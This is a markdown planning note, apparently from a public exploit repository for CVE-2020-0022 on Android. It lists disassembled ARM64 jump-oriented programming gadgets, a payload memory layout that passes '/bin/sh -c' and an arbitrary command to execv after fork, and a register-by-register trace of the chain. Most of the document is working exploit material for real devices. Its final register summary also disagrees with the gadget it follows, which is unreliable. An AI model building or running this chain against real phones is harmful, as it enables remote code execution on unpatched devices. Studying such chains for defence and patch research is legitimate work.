# JOP Chain Plan

This is the second iteration of a JOP chain. The first iteration/attempt (which calls execv directly) can be found in [commit ca28fdf](https://github.com/themmokhtar/CVE-2020-0022/blob/ca28fdf63ba1533685d64f57317e67dbd23c3fd7/notes/JOP_PLAN.md).

## The Coolest Gadgets We Found
First, let us indicate the really cool gadgets we found (all the junk is in possible_jop_gadgets.txt):

Gadget 1:
```
00106138 f5 03 00 aa     mov        x21,x0
0010613c 95 02 00 b4     cbz        x21,LAB_0010618c
00106140 a8 16 40 f9     ldr        x8,[x21, #0x28]
00106144 e0 03 15 aa     mov        x0,x21
00106148 00 01 3f d6     blr        x8
0010614c a8 1a 40 f9     ldr        x8,[x21, #0x30]
00106150 e0 03 15 aa     mov        x0,x21
00106154 00 01 3f d6     blr        x8
```
- Allows us to use x21
- Makes two controlled blr calls to custom addresses

Gadget 2:
```
000b721c a8 1e 40 f9     ldr        x8,[x21, #0x38]
000b7220 b5 42 00 91     add        x21,x21,#0x10
000b7224 e0 03 15 aa     mov        x0,x21
000b7228 00 01 3f d6     blr        x8
000b722c 98 00 00 b4     cbz        x24,LAB_000b723c
000b7230 08 1b 40 f9     ldr        x8,[x24, #0x30]
000b7234 e0 03 18 aa     mov        x0,x24
000b7238 00 01 3f d6     blr        x8
```
- Similar to gadget 1, but uses x24 on the second call

Gadget 3:
```
000b721c a8 1e 40 f9     ldr        x8,[x21, #0x38]
000b7220 b5 42 00 91     add        x21,x21,#0x10
000b7224 e0 03 15 aa     mov        x0,x21
000b7228 00 01 3f d6     blr        x8
```
- This is a part of Gadget 2
- A super great JOP dispatcher gadget that uses x21
- Its only (good) side effect is that it sets x0 to the current table address
        
Gadget 4:
```
000c5a80 08 1f 40 f9     ldr        x8,[x24, #0x38]
000c5a84 18 43 00 91     add        x24,x24,#0x10
000c5a88 e0 03 18 aa     mov        x0,x24
000c5a8c 00 01 3f d6     blr        x8
```
- Another super great JOP dispatcher gadget that uses x24
- Similarly to Gadget 3, its only (good) side effect is that it sets x0 to the current table address

Gadget 5:
```
0012bd00 e0 02 40 f9     ldr        x0,[x23]=>android::AssetManager::IDMAP_BIN       = ??
0012bd04 a1 23 02 d1     sub        x1,x29,#0x88
0012bd08 58 f5 fd 97     bl         <EXTERNAL>::execv                                int execv(char * __path, char * 

OR

                     <EXTERNAL>::execv                               XREF[1]:     FUN_0012b8b0:0012bd08(c)  
000a9268 10 0d 00 f0     adrp       x16,0x24c000
000a926c 11 72 46 f9     ldr        x17,[x16, #0xce0]=>-><EXTERNAL>::execv           = 00258170
000a9270 10 82 33 91     add        x16,x16,#0xce0
000a9274 20 02 1f d6     br         x17=><EXTERNAL>::execv                           int execv(char * __path, char * 
```
- Both call execv
- The first loads x0 and x1 using x23 and x29 respectively
- We can call execv directly if we want if we can control x0 and x1 easily

Gadget 6:
```
001a7c90 f3 03 00 aa     mov        x19,x0
001a7c94 73 02 00 b4     cbz        x19,LAB_001a7ce0
001a7c98 68 02 40 f9     ldr        x8,[x19]
001a7c9c 60 26 40 f9     ldr        x0,[x19, #0x48]
001a7ca0 61 0a 40 f9     ldr        x1,[x19, #0x10]
001a7ca4 00 01 3f d6     blr        x8
```
- Loads two params and a function address then jumps to that function with those params
- This can be used to call execv really easily!

Gadget 7:
```
0010f598 a0 8e 5f f8     ldr        x0,[x21, #-0x8]!
0010f59c bf 02 00 f9     str        xzr,[x21]
0010f5a0 80 00 00 b4     cbz        x0,LAB_0010f5b0
0010f5a4 08 00 40 f9     ldr        x8,[x0]
0010f5a8 08 05 40 f9     ldr        x8,[x8, #0x8]
0010f5ac 00 01 3f d6     blr        x8
```
- A really wonderful dispatcher gadget that uses x21, but it's in reverse and needs more than 1 pointer per jump

Gadget 8:
```
001419a8 00 34 40 f9     ldr        x0,[x0, #0x68]
001419ac 08 00 40 f9     ldr        x8,[x0]
001419b0 08 09 40 f9     ldr        x8,[x8, #0x10]
001419b4 42 7c 40 93     sxtw       x2,w2
001419b8 00 01 3f d6     blr        x8
```
- A really cool gadget that we can use to modify x0 and call another controlled function at a custom address

And there are more cool gadgets, but these are the ones I find most notable. Using these gadgets we can create a full-on JOP chain that calls `mprotect` and runs custom shellcode, but I have a smarter (and easier) plan.

## The Plan
`libandroid_runtime.so` calls `execv`, so we really don't need to do the same thing insinuator did (which is calling `dlsym`, then calling `system` using its result). If we can just call `execv``, we win. Gadgets 5, 6 & 8 give us easy call to execv :)

Here's how the payload will be:
```
0x00: payload_address + 0x08
0x08: double_call_gadget_address
0x10: execv_function_address
0x18: <UNUSED>
0x20: payload_address + 0x58
0x28: fork_function_address
0x30: adder_gadget_address
0x38: caller_gadget_address
0x40: "/bin/sh\0"
0x48: "-c\0\0\0\0\0\0"
0x50: <UNUSED>
0x58: payload_address + 0x40
0x60: payload_address + 0x48
0x68: payload_address + 0x78
0x70: 0
0x78: Whatever command we want executed starts here
```

### Execution
This is the (relevant part of the) initial CPU State:
```
x0 = payload_addr
x8 = libchrome_gadget_addr
x19 = ??
x21 = ??
pc = libchrome_gadget_addr
```

Here's how the execution should go:
#### Libchrome Gadget (The one that gives us PC control in the first place)
Gadget:
```
000dbc5c 08 00 40 f9     ldr        x8,[x0]             // x8 = *(payload_addr) = payload_addr + 0x08
000dbc60 08 01 40 f9     ldr        x8,[x8]             // x8 = *(payload_addr + 0x08) = double_call_gadget_address
000dbc64 e1 03 14 aa     mov        x1,x20              // Acceptable side effect: x1 = x20
000dbc68 00 01 3f d6     blr        x8                  // Jump to double_call_gadget_address
```
New CPU State:
```
x0 = payload_addr
x8 = double_call_gadget_address
x19 = ??
x21 = ??
pc = double_call_gadget_address
```

#### Double Call Gadget
Gadget:
```
00106138 f5 03 00 aa     mov        x21,x0              // x21 = payload_addr (synced x21 with x0)
0010613c 95 02 00 b4     cbz        x21,LAB_0010618c    // NOP: branch not taken
00106140 a8 16 40 f9     ldr        x8,[x21, #0x28]     // x8 = *(payload_addr + 0x28) = fork_function_address
00106144 e0 03 15 aa     mov        x0,x21              // NOP: x0 is already equal to x21
00106148 00 01 3f d6     blr        x8                  // Jump to fork_function_address, then return to to pc + 0x4
0010614c a8 1a 40 f9     ldr        x8,[x21, #0x30]     // x8 = *(payload_addr + 0x30) = adder_gadget_address
00106150 e0 03 15 aa     mov        x0,x21              // Removes the value returned by fork_function_address from x0 and sets it to x21 instead
00106154 00 01 3f d6     blr        x8                  // Jump to adder_gadget_address
```
New CPU State:
```
x0 = payload_addr
x8 = adder_gadget_address
x19 = ??
x21 = payload_addr
pc = adder_gadget_address
```

#### X21 Adder Gadget
Gadget:
```
000b721c a8 1e 40 f9     ldr        x8,[x21, #0x38]     // x8 = *(payload_addr + 0x38) = caller_gadget_address
000b7220 b5 42 00 91     add        x21,x21,#0x10       // x21 = payload_addr + 0x10
000b7224 e0 03 15 aa     mov        x0,x21              // x0 = payload_addr + 0x10
000b7228 00 01 3f d6     blr        x8                  // Jump to caller_gadget_address
```
New CPU State:
```
x0 = payload_addr + 0x10
x8 = caller_gadget_address
x19 = ??****
x21 = payload_addr + 0x10
pc = caller_gadget_address
```

#### Caller Gadget
Gadget:
```
001a7c90 f3 03 00 aa     mov        x19,x0           // x19 = payload_addr + 0x10
001a7c94 73 02 00 b4     cbz        x19,LAB_001a7ce0 // NOP: branch not taken
001a7c98 68 02 40 f9     ldr        x8,[x19]         // x8 = *(payload_addr + 0x10) = execv_function_address
001a7c9c 60 26 40 f9     ldr        x0,[x19, #0x48]  // x0 = *(payload_addr + 0x58) = payload_address + 0x40
001a7ca0 61 0a 40 f9     ldr        x1,[x19, #0x10]  // x1 = *(payload_addr + 0x20) = payload_address + 0x58
001a7ca4 00 01 3f d6     blr        x8               // Jump to execv_function_address
```
New CPU State:
```
x0 = payload_addr + 0x10
x8 = execv_function_address
x19 = payload_addr + 0x10
x21 = payload_addr + 0x10
pc = execv_function_address
```
